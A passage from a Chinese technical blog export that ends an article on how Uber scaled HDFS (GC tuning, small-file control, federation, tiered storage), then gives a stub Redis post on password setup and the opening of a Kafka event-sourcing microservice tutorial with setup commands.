<p>升级 HDFS 可能会有风险, 因为它可能会导致停机、性能下降或数据丢失。为了解决这些可能的问题, 我们花了几个月的时间来验证 Apache  2.8.2 之后才将其部署到生产环境中。但是, 在升级最大的生产集群时, 仍然有一个 Bug (HDFS-12800) 让我们措手不及。尽管 Bug 引起的问题很晚才发现, 但是凭借独立群集、分阶段升级过程（a staged upgrade process）和应急回滚计划（contingency rollback plans），最后给我们的影响非常有限。</p>
<p>事实证明，在同一台服务器上运行不同版本的 YARN 和 HDFS 的能力对于我们实现扩展至关重要。由于 YARN 和 HDFS 都是 Hadoop 的一部分, 它们通常一起升级。然而,  YARN 主线版本的升级需要更长时间的充分验证之后才会推出, 一些生产应用的 YARN 可能需要更新，由于 YARN  API 的变化或  YARN 和这些应用的 JAR 依赖冲突。虽然 YARN 的可伸缩性在我们的环境中不是一个问题, 但我们不希望关键的 HDFS 升级被 YARN 升级阻塞。为了防止可能的堵塞, 我们目前运行的 YARN 比 HDFS 的版本更早, 在我们的场景很有效。(但是, 当采用诸如 Erasure Coding 之类的功能时, 由于需要更改客户端, 此策略可能不起作用。）</p>
<h4 id="NameNode-Garbage-collection"><a href="#NameNode-Garbage-collection" class="headerlink" title="NameNode Garbage collection"></a>NameNode Garbage collection</h4><p>垃圾回收 (Garbage collection , GC) 调优在整个优化方案中也发挥了重要作用。它在扩展存储基础架构的同时，给我们创造了必要的喘息空间。</p>
<p>通过强制使用并发标记扫描收集器 (Concurrent Mark Sweep collectors ，CMS) 防止长时间 GC 暂停, 通过调整 CMS 参数 (如 CMSInitiatingOccupancyFraction、UseCMSInitiatingOccupancyOnly 和 CMSParallelRemarkEnabled ) 来执行更具侵略性的老年代集合（注：CMS 是分代的，新生代和老年代都会发生回收。CMS 尝试通过多线程并发的方式来跟踪对象的可达性，以便减少老生代的收集时间）。虽然会增加 CPU 利用率, 但幸运的是我们有足够的空闲 CPU 来支持此功能。</p>
<p>由于繁重的 RPC 负载, 在新生代中创建了大量短期的对象, 迫使新生代收集器频繁地执行垃圾回收暂停（stop-the-world）。通过将新生代的规模从 1.5GB 增加到 16GB , 并调整 ParGCCardsPerStrideChunk 值 (设置为 32768), 生产环境中 NameNode 在 GC 暂停时所花费的总时间从 13% 减少到 1.7% , 吞吐量增加了 10% 以上。</p>
<p>与 GC 相关的 JVM 参数( NameNode  堆大小 160GB ）, 供参考：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XX:+UnlockDiagnosticVMOptions</span><br><span class="line">XX:ParGCCardsPerStrideChunk=32768 -XX:+UseParNewGC</span><br><span class="line">XX:+UseConcMarkSweepGC -XX:+CMSConcurrentMTEnabled</span><br><span class="line">XX:CMSInitiatingOccupancyFraction=40</span><br><span class="line">XX:+UseCMSInitiatingOccupancyOnly</span><br><span class="line">XX:+CMSParallelRemarkEnabled -XX:+UseCondCardMark</span><br><span class="line">XX:+DisableExplicitGC</span><br></pre></td></tr></table></figure>
<p>Uber 还在评估是否将第一垃圾回收器 (Garbage-First Garbage Collector , G1GC) 集成在系统中。虽然在过去使用 G1GC 时没有看到优势, 但 JVM 的新版本带来了额外的垃圾回收器性能改进, 因此重新审视收集器和配置的选择有时是必要的。</p>
<ul>
<li><img src="http://riboseyim-qiniu.riboseyim.com/Uber-Hadoop-201809-3.png" alt="Figure 3. By increasing the young generation size from 1.5GB to 16GB and tuning the ParGCCardsPerStrideChunk value, the total time our production NameNode spent on GC pause decreased from 13 percent to 1.7 percent."></li>
</ul>
<h4 id="Controlling-the-number-of-small-files"><a href="#Controlling-the-number-of-small-files" class="headerlink" title="Controlling the number of small files"></a>Controlling the number of small files</h4><p>由于 NameNode 将所有文件元数据加载到内存中, 小文件增长会增加 NameNode 的内存压力。此外, 小文件会导致读取 RPC 调用增加, 以便在客户端读取文件时访问相同数量的数据, 以及在生成文件时增加 RPC 调用。为了减少存储中小文件的数量, Uber 主要采取了两种方法：</p>
<p>首先，Uber Hadoop 数据平台团队基于 Hoodie 库建立了新的摄取管道, 生成比原始数据管道创建的更大的文件。不过, 作为一个临时解决方案, 在这些可用之前, 我们还建立了一个工具 (称为 stitcher  “订书机”), 将小文件合并成较大的文件（通常大于 1GB ）。</p>
<p>其次, 在 Hive 数据库和应用程序目录上设置了严格的命名空间配额。为了贯彻这一目标, 我们为用户创建了一个自助服务工具, 用于管理其组织内的配额。配额的分配比例为每文件 256MB, 以鼓励用户优化其输出文件大小。Hadoop 团队还提供优化指南和文件合并工具以帮助用户采用最佳实践。例如, 在 Hive 上启用自动合并（auto-merge）和调整减速器数量（the number of reducers ）可以大大减少由 Hive   insert-overwrite 查询生成的文件数。</p>
<h4 id="HDFS-load-management-service"><a href="#HDFS-load-management-service" class="headerlink" title="HDFS load management service"></a>HDFS load management service</h4><p>运行大型多租户基础架构 (如 HDFS ) 的最大挑战之一是检测哪些应用程序导致异常大的负载、如何快速采取措施来修复它们。为了实现这一目的，Uber 构建了内置 HDFS 的负载管理服务, 称为 Spotlight 。</p>
<p>在目前的 Spotlight 实现中, 审计日志从活跃的 NameNode 以流的形式送到一个基于 Flink 和 Kafka 的后端实时处理。最后，日志分析结果通过仪表板输出, 并用于自动化处理（例如自动禁用帐户或杀死导致 HDFS 减速的工作流）。</p>
<ul>
<li><img src="http://riboseyim-qiniu.riboseyim.com/Uber-Hadoop-201809-4.png" alt="Figure 4. Spotlight enables us to identify and disable accounts that are causing HDFS slowdown."></li>
</ul>
<h4 id="New-Feature-Observer-NameNode"><a href="#New-Feature-Observer-NameNode" class="headerlink" title="New Feature : Observer NameNode"></a>New Feature : Observer NameNode</h4><p>Uber 正在开发一个新的 HDFS 功能 Observer NameNode (HDFS-12975)   。 Observer NameNode 设计为一个 NameNode 只读副本, 目的是减少在活跃的 NameNode 群集上加载。由于 HDFS RPC 容量和增长的一半以上来自只读的 Presto 查询, Uber 希望借助 Observer NameNodes 的帮助将总体 NameNode 吞吐量扩展到 100% 。Uber 已经完成了这个工具的验证, 并正在将其投入生产环境中。</p>
<ul>
<li><img src="http://riboseyim-qiniu.riboseyim.com/Uber-Hadoop-201809-5.jpg" alt="Figure 5. Uber Engineering’s current HDFS architecture incorporates high availability and Observer NameNodes."></li>
</ul>
<h2 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h2><ul>
<li>Layer your solutions: 考虑不同层次的解决方案。实现像 Observer NameNode 那样的工具或将 HDFS 切分到多集群需要付出巨大的努力。短期措施, 如 GC 调整和通过 stitcher 合并较小的文件, 给了我们很多喘息的空间以开发完善长期的解决方案。</li>
<li>Bigger is better: 因为小文件对 HDFS 的威胁, 所以最好及早解决它们, 而不是延后。主动向用户提供工具、文档和培训是帮助实施最佳实践非常有效的方法。</li>
<li>Participate in the community: Hadoop 已经存在超过 10 年了, 其社区比以往任何时候都更加活跃, 几乎每个版本中都引入了可伸缩性和功能改进。通过贡献您自己的发现和工具来参与 Hadoop 社区对于你持续扩展基础架构非常重要。</li>
</ul>
<h2 id="未来"><a href="#未来" class="headerlink" title="未来"></a>未来</h2><p>在不久的将来, Uber 计划将各种新服务集成到存储系统（如 图6 所示）。</p>
<ul>
<li><img src="http://riboseyim-qiniu.riboseyim.com/Uber-Hadoop-201809-6.png" alt="Figure 6. Our near-future HDFS architecture will incorporate several additional features and functionalities that will contribute to the growth of our storage
infrastructure."></li>
</ul>
<p>接下来重点介绍两个主要项目, 基于路由的 HFDS Federation 和 tiered storage :</p>
<h4 id="Router-based-HDFS-Federation"><a href="#Router-based-HDFS-Federation" class="headerlink" title="Router-based HDFS Federation"></a>Router-based HDFS Federation</h4><p>Uber 目前使用 ViewFs 扩展 HDFS （当 subclusters 超载时）。此方法的主要问题是, 每次在 ViewFs 上添加或替换新的挂载点时, 都需要更改客户端配置, 而且很难在不影响生产工作流的情况下进行。这种困境是我们目前只拆分不需要大规模更改客户端数据的主要原因之一, 例如 YARN 日志聚合。</p>
<p>Microsoft 的新倡议—基于路由的 HFDS Federation (<a href="https://issues.apache.org/jira/browse/HDFS-10467">HDFS-10467</a>, <a href="https://issues.apache.org/jira/browse/HDFS-12615">HDFS-12615</a>),目前包含在 HDFS 2.9 版本中, 是一个基于 ViewFs 的分区联盟的扩展。该联盟添加了一层软件集中管理 HDFS 命名空间。通过提供相同的接口 (RPC 和 WebHDFS 的组合), 它的外层为用户提供了对任何 subclusters 的透明访问, 并让 subclusters 独立地管理其数据。</p>
<p>通过提供再平衡工具( a rebalancing tool ), 联盟层( the federation layer )还将支持跨 subclusters 的透明数据移动, 用于平衡工作负载和实现分层存储。联盟层集中式维护状态存储区中全局命名空间的状态, 并允许多个活跃的路由器将用户请求定向到正确的 subclusters 时启动和运行。</p>
<p>Uber 正在积极地与 Hadoop 社区密切协作，致力于将基于路由的 HDFS Federation 引入到生产环境, 并进一步开源改进, 包括支持 WebHDFS 。</p>
<h4 id="Tiered-Storage"><a href="#Tiered-Storage" class="headerlink" title="Tiered Storage"></a>Tiered Storage</h4><p>随着基础架构的规模增长, 降低存储成本的重要性也同样重要。Uber 技术团队中进行的研究表明, 相较旧数据 (warm data)  用户会更频繁地访问最近的数据 (hot data)。将旧数据移动到一个单独的、占用较少资源的层将大大降低我们的存储成本。HDFS  Erasure Coding 、Router-based Federation、高密度 (250TB 以上) 硬件和数据移动服务 (在 “热” 层群集和 “暖” 层群集之间处理移动数据) 是即将进行的分层存储设计的关键组件。Uber 计划在以后的文章中分享在分层存储实现方面的经验。</p>
<h2 id="Apache-Hadoop-ABC"><a href="#Apache-Hadoop-ABC" class="headerlink" title="Apache Hadoop ABC"></a>Apache Hadoop ABC</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hadoop version</span><br><span class="line">Hadoop 3.1.0</span><br><span class="line">Source code repository https://github.com/apache/hadoop -r 16b70619a24cdcf5d3b0fcf4b58ca77238ccbe6d</span><br><span class="line">Compiled by centos on 2018-03-30T00:00Z</span><br><span class="line">Compiled with protoc 2.5.0</span><br><span class="line">From <span class="built_in">source</span> with checksum 14182d20c972b3e2105580a1ad6990</span><br><span class="line">This <span class="built_in">command</span> was run using /usr/<span class="built_in">local</span>/Cellar/hadoop/3.1.0/libexec/share/hadoop/common/hadoop-common-3.1.0.jar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常见异常：检查 JDK 版本是否过低</span></span><br><span class="line">$ hadoop version</span><br><span class="line">Exception <span class="keyword">in</span> thread <span class="string">&quot;main&quot;</span> java.lang.UnsupportedClassVersionError: org/apache/hadoop/util/VersionInfo : Unsupported major.minor version 52.0</span><br><span class="line">	at java.lang.ClassLoader.defineClass1(Native Method)</span><br></pre></td></tr></table></figure>
<h4 id="Java-Garbage-Collection-Types"><a href="#Java-Garbage-Collection-Types" class="headerlink" title="Java Garbage Collection Types"></a>Java Garbage Collection Types</h4><ul>
<li><p>Serial GC (-XX:+UseSerialGC): Serial GC uses the simple mark-sweep-compact approach for young and old generations garbage collection i.e Minor and Major GC.<br>Serial GC is useful in client-machines such as our simple stand alone applications and machines with smaller CPU. It is good for small applications with low memory footprint.</p>
</li>
<li><p>Parallel GC (-XX:+UseParallelGC): Parallel GC is same as Serial GC except that is spawns N threads for young generation garbage collection where N is the number of CPU cores in the system. We can control the number of threads using -XX:ParallelGCThreads=n JVM option.<br>Parallel Garbage Collector is also called throughput collector because it uses multiple CPUs to speed up the GC performance. Parallel GC uses single thread for Old Generation garbage collection.</p>
</li>
<li><p>Parallel Old GC (-XX:+UseParallelOldGC): This is same as Parallel GC except that it uses multiple threads for both Young Generation and Old Generation garbage collection.<br>Concurrent Mark Sweep (CMS) Collector (-XX:+UseConcMarkSweepGC): CMS Collector is also referred as concurrent low pause collector. It does the garbage collection for Old generation. CMS collector tries to minimize the pauses due to garbage collection by doing most of the garbage collection work concurrently with the application threads.<br>CMS collector on young generation uses the same algorithm as that of the parallel collector. This garbage collector is suitable for responsive applications where we can’t afford longer pause times. We can limit the number of threads in CMS collector using -XX:ParallelCMSThreads=n JVM option.</p>
</li>
<li><p>G1 Garbage Collector (-XX:+UseG1GC): The Garbage First or G1 garbage collector is available from Java 7 and it’s long term goal is to replace the CMS collector. The G1 collector is a parallel, concurrent, and incrementally compacting low-pause garbage collector.<br>Garbage First Collector doesn’t work like other collectors and there is no concept of Young and Old generation space. It divides the heap space into multiple equal-sized heap regions. When a garbage collection is invoked, it first collects the region with lesser live data, hence “Garbage First”. You can find more details about it at Garbage-First Collector Oracle Documentation.</p>
</li>
</ul>
<h2 id="扩展阅读：电子书《Linux-Perf-Master》"><a href="#扩展阅读：电子书《Linux-Perf-Master》" class="headerlink" title="扩展阅读：电子书《Linux Perf Master》"></a>扩展阅读：电子书《Linux Perf Master》</h2><ul>
<li><a href="https://riboseyim.gitbook.io/perf">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<h2 id="扩展阅读：开源架构技术漫谈"><a href="#扩展阅读：开源架构技术漫谈" class="headerlink" title="扩展阅读：开源架构技术漫谈"></a>扩展阅读：开源架构技术漫谈</h2><ul>
<li><a href="https://riboseyim.github.io/2018/08/01/OpenSource-Hadoop/">开源架构技术漫谈：Hadoop</a></li>
<li><a href="https://riboseyim.github.io/2017/06/12/OpenSource-Kafka-Microservice/">基于Kafka构建事件溯源型微服务</a></li>
<li><a href="https://riboseyim.github.io/2017/05/23/RestfulAPI/">基于Go语言快速构建一个RESTful API服务</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.github.io/2017/05/12/SDN/">SDN 技术指南（一）: 架构概览</a></li>
<li><a href="https://riboseyim.github.io/2017/08/22/SDN-OpenFlow/">SDN 技术指南（二）: OpenFlow </a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">网络数据包的捕获与分析（libpcap、BPF及gopacket）</a></li>
<li><a href="https://riboseyim.github.io/2017/10/30/Protocol-gRPC/">计算机远程通信协议：从 CORBA 到 gRPC</a></li>
<li><a href="https://riboseyim.github.io/2016/09/01/AAA/">基于LVS的AAA负载均衡架构实践</a></li>
<li><a href="https://riboseyim.github.io/2016/11/04/OpenSource-Ganglia/">基于Ganglia实现服务集群性能态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/07/23/CloudComputing/">Stack Overflow：云计算平台的趋势分析</a></li>
<li><a href="https://riboseyim.github.io/2017/07/23/CloudComputing/">Stack Overflow：2017年最赚钱的编程语言</a></li>
<li><a href="https://riboseyim.github.io/2016/07/17/OpenSource-StackOverflow/">Stack Overflow: The Architecture &amp; Hardware - 2016 Edition</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.journaldev.com/2856/java-jvm-memory-model-memory-management-in-java#java-visualvm-with-visual-gc">Java (JVM) Memory Model – Memory Management in Java</a></li>
<li><a href="https://docs.hortonworks.com/HDPDocuments/HDP3/HDP-3.0.0/data-storage/content/example_viewfs_mounttable_entries.html">Example of ViewFs mount table entries</a></li>
<li><a href="https://blog.twitter.com/engineering/en_us/a/2015/hadoop-filesystem-at-twitter.html">Hadoop filesystem at Twitter</a></li>
<li><a href="http://dongxicheng.org/mapreduce/hdfs-federation-introduction/">董的博客-HDFS Federation设计动机与基本原理</a></li>
<li><a href="https://tech.meituan.com/presto.html">Presto实现原理和美团的使用实践</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>OpenSource</tag>
        <tag>Engineering</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>开源技术架构漫谈：Redis</title>
    <url>/2018/08/07/OpenSource-DB-Redis/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="Introduction-Redis-简介"><a href="#Introduction-Redis-简介" class="headerlink" title="Introduction | Redis 简介"></a>Introduction | Redis 简介</h2><h2 id="Core-Concept-Redis-核心概念"><a href="#Core-Concept-Redis-核心概念" class="headerlink" title="Core Concept | Redis 核心概念"></a>Core Concept | Redis 核心概念</h2><ul>
<li><a href="#">art</a></li>
</ul>
<h4 id="Concept-A"><a href="#Concept-A" class="headerlink" title="Concept A"></a>Concept A</h4><h4 id="Concept-B"><a href="#Concept-B" class="headerlink" title="Concept B"></a>Concept B</h4><h4 id="Concept-C"><a href="#Concept-C" class="headerlink" title="Concept C"></a>Concept C</h4><h2 id="Architecture-Redis-架构"><a href="#Architecture-Redis-架构" class="headerlink" title="Architecture | Redis 架构"></a>Architecture | Redis 架构</h2><h2 id="Best-Practice-Redis-最佳实践"><a href="#Best-Practice-Redis-最佳实践" class="headerlink" title="Best Practice | Redis 最佳实践"></a>Best Practice | Redis 最佳实践</h2><h2 id="Redis-ABC"><a href="#Redis-ABC" class="headerlink" title="Redis ABC"></a>Redis ABC</h2><h2 id="Redis-Tips"><a href="#Redis-Tips" class="headerlink" title="Redis Tips"></a>Redis Tips</h2><h4 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h4><p>Redis 访问控制较弱，仅提供轻量级的认证方式，通过编辑 redis.conf 配置启用。</p>
<ul>
<li>初始化密码</li>
</ul>
<p>redis.conf 参数： requirepass<br>参考配置（重启 Redis 生效）： requirepass test123</p>
<ul>
<li>不重启设置密码</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis 127.0.0.1:6379&gt; config <span class="built_in">set</span> requirepass <span class="built_in">test</span>123</span><br><span class="line">redis 127.0.0.1:6379&gt; config get requirepass</span><br><span class="line">1) <span class="string">"requirepass"</span></span><br><span class="line">2) <span class="string">"test123"</span></span><br></pre></td></tr></table></figure>
<ul>
<li>密码验证</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.1.2 -p 6379 <span class="_">-a</span> <span class="built_in">test</span>123</span><br><span class="line">redis 127.0.0.1:6379&gt; auth <span class="built_in">test</span>123</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
<h4 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h4><ul>
<li><a href="https://github.com/piaohao/godis" target="_blank" rel="noopener">redis client implement by golang</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>开源架构技术漫谈：基于Kafka构建事件溯源模式的微服务</title>
    <url>/2017/06/12/OpenSource-Kafka-Microservice/</url>
    <content><![CDATA[<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p>本文中我们将讨论如何借助 Kafka 实现分布式消息管理，使用事件溯源（Event Sourcing）模式实现原子化数据处理，使用CQRS模式（Command-Query Responsibility Segregation ）实现查询职责分离，使用消费者群组解决单点故障问题，理解分布式协调框架Zookeeper的运行机制。整个应用的代码实现使用Go语言描述。</p>
<ul>
<li>第一部分 引子、环境准备、整体设计及实现</li>
<li>第二部分 消息消费者及其集群化</li>
<li>第三部分 测试驱动开发、Docker部署和持续集成</li>
</ul>
<span id="more"></span>
<h1 id="第一部分-引子、环境准备、整体设计及实现"><a href="#第一部分-引子、环境准备、整体设计及实现" class="headerlink" title="第一部分 引子、环境准备、整体设计及实现"></a>第一部分 引子、环境准备、整体设计及实现</h1><h2 id="为什么需要微服务"><a href="#为什么需要微服务" class="headerlink" title="为什么需要微服务"></a>为什么需要微服务</h2><p>微服务本身并不算什么新概念，它要解决的问题在软件工程历史中早已经有人提出：解耦、扩展性、灵活性，解决“烂架构”膨胀后带来的复杂度问题。</p>
<h5 id="Conway’s-law（康威定律）"><a href="#Conway’s-law（康威定律）" class="headerlink" title="Conway’s law（康威定律）"></a>Conway’s law（康威定律）</h5><blockquote>
<p><strong>Any organization that designs a system (defined broadly) will produce a design whose structure is a copy of the organization’s communication structure.（任何组织在设计一套系统（广义概念上的系统）时，所交付的设计方案在结构上都与该组织的通信结构保持一致）<br>— Melvyn Conway, 1967</strong></p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/MicroService_Org.png" alt=""></p>
<blockquote>
<p>《人月神话》：Adding manpower to a late software project makes it later —Fred Brooks, (1975)</p>
</blockquote>
<p>为了赶进度加程序员就像用水去灭油锅里的火一样，原因在于：沟通成本 = n(n-1)/2，沟通成本随着项目或者组织的人员增加呈指数级增长。很多项目在经过一段时间的发展之后，都会有不少恐龙级代码，无人敢挑战。比如一个类的规模就多达数千行，核心方法近千行，大量重复代码，每次调整都以失败告终。庞大的系统规模导致团队新成员接手困难，项目组人员增加导致的代码冲突问题，系统复杂度的增加导致的不确定上线风险、引入新技术困难等。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/MicroServices_Math_Demo.png" alt=""></p>
<p>微服务 (Microservices)是解决这些困难的众多方案之一。它本质上是一种软件架构风格，它是以专注于单一责任与功能的小型功能区块 (Small Building Blocks) 为基础，利用模组化的方式组合出复杂的大型应用程序，各功能区块使用与语言无关 (Language-Independent/Language agnostic) 的 API 集相互通讯。</p>
<h5 id="Event-Sourcing（事件溯源）"><a href="#Event-Sourcing（事件溯源）" class="headerlink" title="Event Sourcing（事件溯源）"></a>Event Sourcing（事件溯源）</h5><p>真正构建一个微服务是非常具有挑战性的。其中一个最重要的挑战就是原子化————如何处理分布式数据，如何设计服务的粒度。例如，常见的客户、工单场景，如果拆分成两个服务，查询都变成了一个难题：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">order</span> o, customer c</span><br><span class="line">  <span class="keyword">where</span> o.customer_id <span class="operator">=</span> c.id</span><br><span class="line">  <span class="keyword">and</span> o.gross_amount <span class="operator">&gt;</span> <span class="number">50000</span></span><br><span class="line">  <span class="keyword">and</span> o.status <span class="operator">=</span> <span class="string">&#x27;PAID&#x27;</span></span><br><span class="line">  <span class="keyword">and</span> c.country <span class="operator">=</span> <span class="string">&#x27;INDONESIA&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>在DDD领域（Domain-Driven Design，领域驱动设计）有一种架构风格被广泛应用，即CQRS （Command Query Responsibility Seperation，命令查询职责分离）。CQRS最核心的概念是Command、Event，“将数据(Data)看做是事实(Fact)。每个事实都是过去的痕迹，虽然这种过去可以遗忘，但却无法改变。” 这一思想直接发展了Event Source，即将这些事件的发生过程记录下来，使得我们可以追溯业务流程。CQRS对设计者的影响，是将领域逻辑，尤其是业务流程，皆看做是一种领域对象状态迁移的过程。这一点与REST将HTTP应用协议看做是应用状态迁移的引擎，有着异曲同工之妙。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/MicroService_EventSourcing.png" alt=""></p>
<h2 id="实现方案"><a href="#实现方案" class="headerlink" title="实现方案"></a>实现方案</h2><h3 id="Kafka-in-a-Nutshell"><a href="#Kafka-in-a-Nutshell" class="headerlink" title="Kafka in a Nutshell"></a>Kafka in a Nutshell</h3><p>Apache Kafka是由Apache软件基金会开发的一个开源消息中间件项目，由Scala写成。Kafka最初是由LinkedIn开发，并于2011年初开源。2012年10月从Apache Incubator毕业。该项目的目标是为处理实时数据提供一个统一、高吞吐、低延迟的平台。Kafka使用Zookeeper作为其分布式协调框架，很好的将消息生产、消息存储、消息消费的过程结合在一起。同时借助Zookeeper，kafka能够生产者、消费者和broker在内的所以组件在无状态的情况下，建立起生产者和消费者的订阅关系，并实现生产者与消费者的负载均衡。</p>
<ul>
<li>Kafka Core Words<br>Broker:Kafka集群包含一个或多个服务器，这种服务器被称为broker<br>Topic:每条发布到Kafka集群的消息都有一个类别，这个类别被称为Topic。Topic相当于数据库中的Table，行数据以log的形式存储，非常类似Git中commit log。物理上不同Topic的消息分开存储，逻辑上一个Topic的消息虽然保存于一个或多个broker上但用户只需指定消息的Topic即可生产或消费数据而不必关心数据存于何处。<br>Partition:Parition是物理上的概念，每个Topic包含一个或多个Partition.<br>Producer:消息生产者，负责发布消息到Kafka broker<br>Consumer:消息消费者，向Kafka broker读取消息的客户端。<br>Consumer Group：每个Consumer属于一个特定的Consumer Group（可为每个Consumer指定group name，若不指定则属于默认的group）。</li>
</ul>
<h3 id="整体设计"><a href="#整体设计" class="headerlink" title="整体设计"></a>整体设计</h3><p>案例：假设一个银行账户系统。经过一段时间的经营发展，该行客户数量和交易规模都有了巨大的增长，系统内部变得异常复杂，每一个部分都变得沉重不堪。我们尝试对他的业务单元进行解耦，例如将余额计算逻辑从原有的核心系统拆分出来。根据银行账户业务特点，我们设计一个生产者——负责根据业务事件触发生成一个事件，所有事件基于Kafka存储，再设计一个消费者——负责从Kafka抓去未处理事件，通过调用业务逻辑处理单元完成后续持久化操作。这样一个账户的所有业务操作都可以有完整的快照历史，符合金融业务Audit（审计）的需要。而且通过使用事件，我们可以很方便地重建数据。</p>
<p><strong>业务事件列表：</strong></p>
<ul>
<li>CreateEvent：开户</li>
<li>DepositEvent：存款</li>
<li>WithdrawEvent：取款</li>
<li>TransferEvent：转账</li>
</ul>
<p><strong>领域模型：账户（Account）</strong><br>holder’s name:持有人名称<br>balance：余额<br>registration date：开户日期<br>……</p>
<p><strong>领域模型：事件（Event）</strong><br>name:事件名称<br>ID：序号<br>……</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/MicroService_EventSourcing_Classes.png" alt=""></p>
<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul>
<li>第一步，启动<a href="https://zookeeper.apache.org/">ZooKeeper</a>:</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget http://mirror.bit.edu.cn/apache/kafka/0.10.1.0/kafka_2.10-0.10.1.0.tgz</span><br><span class="line">$ tar -xvf kafka_2.10-0.10.1.0.tgz</span><br><span class="line">$ <span class="built_in">cd</span> kafka_2.10-0.10.1.0</span><br><span class="line">$ bin/zookeeper-server-start.sh config/zookeeper.properties</span><br><span class="line">$ netstat -an | grep 2181</span><br><span class="line">tcp46      0      0  *.2181                 *.*                    LISTEN     </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li><p>第二步，启动<a href="https://kafka.apache.org/">Kafka</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ bin/kafka-server-start.sh config/server.properties   </span><br><span class="line"></span><br><span class="line">[2017-06-13 14:03:08,168] INFO New leader is 0 (kafka.server.ZookeeperLeaderElector<span class="variable">$LeaderChangeListener</span>)</span><br><span class="line">[2017-06-13 14:03:08,172] INFO Kafka version : 0.10.1.0 (org.apache.kafka.common.utils.AppInfoParser)</span><br><span class="line">[2017-06-13 14:03:08,172] INFO Kafka commitId : 3402a74efb23d1d4 (org.apache.kafka.common.utils.AppInfoParser)</span><br><span class="line">[2017-06-13 14:03:08,173] INFO [Kafka Server 0], started (kafka.server.KafkaServer)</span><br><span class="line"></span><br><span class="line">$ lsof -nP -iTCP -sTCP:LISTEN | sort -n</span><br><span class="line">$ netstat -an | grep 9092</span><br><span class="line">  tcp46      0      0  *.9092                 *.*                    LISTEN</span><br></pre></td></tr></table></figure>
</li>
<li><p>第三步，创建topic</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partition 1 --topic x-microservice-transactions-t1</span><br><span class="line"></span><br><span class="line">Created topic <span class="string">&quot;x-microservice-transactions-t1&quot;</span>.</span><br></pre></td></tr></table></figure>
<ul>
<li>另外，运行多个<a href="https://kafka.apache.org/">Kafka</a> 实例<br>Kafka多实例非常简单，只需要复制文件 server.properties，稍作修改即可。<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">config/server<span class="number">-1.</span>properties:</span><br><span class="line">    broker.id=<span class="number">1</span></span><br><span class="line">    listeners=PLAINTEXT:<span class="comment">//:9093</span></span><br><span class="line">    log.dir=/tmp/kafka-logs<span class="number">-1</span></span><br><span class="line"></span><br><span class="line">config/server<span class="number">-2.</span>properties:</span><br><span class="line">    broker.id=<span class="number">2</span></span><br><span class="line">    listeners=PLAINTEXT:<span class="comment">//:9094</span></span><br><span class="line">    log.dir=/tmp/kafka-logs<span class="number">-2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动多个broker,须指定不同的属性文件</span></span><br><span class="line">$ bin/kafka-server-start.sh config/server<span class="number">-1.</span>properties</span><br><span class="line">$ bin/kafka-server-start.sh config/server<span class="number">-2.</span>properties</span><br></pre></td></tr></table></figure>
</li>
</ul>
